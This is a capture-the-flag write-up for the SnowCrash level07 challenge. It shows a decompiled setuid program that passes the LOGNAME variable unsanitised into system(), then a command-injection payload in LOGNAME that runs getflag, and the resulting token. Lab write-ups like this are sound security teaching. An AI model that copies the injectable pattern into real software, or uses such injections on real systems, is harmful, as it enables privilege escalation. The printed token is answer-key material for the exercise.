## Level 07

So first of all we have a `level07` executable that we decompiled [here](./level07).

We noticed a `setresuid()` and `setresguid()` combo followed by an execution of `echo` with an env variable.

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
	gid_t eax = getegid();
	uid_t eax_1 = geteuid();
	setresgid(eax, eax, eax);
	setresuid(eax_1, eax_1, eax_1);
	char* var_1c = nullptr;
	asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
	return system(var_1c);
}
```

## Exploit

We can use `LOGNAME` to print whatever value we want. We can ask it to gently give us the return value of `getflag` such as:
```bash
level07@SnowCrash:~$ LOGNAME="\`getflag\`"
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Token

fiumuikeil55xe9cu4dood66h